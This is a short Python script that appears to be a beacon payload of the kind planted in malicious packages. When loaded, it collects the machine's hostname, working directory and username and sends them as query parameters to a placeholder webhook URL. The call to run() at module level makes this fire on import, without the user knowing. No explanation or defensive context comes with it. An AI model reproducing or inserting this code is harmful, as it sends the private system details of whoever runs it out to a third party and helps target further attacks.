import os,requests,getpass,socket
def run():
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("<WEBHOOK>",params = ploads)

run()
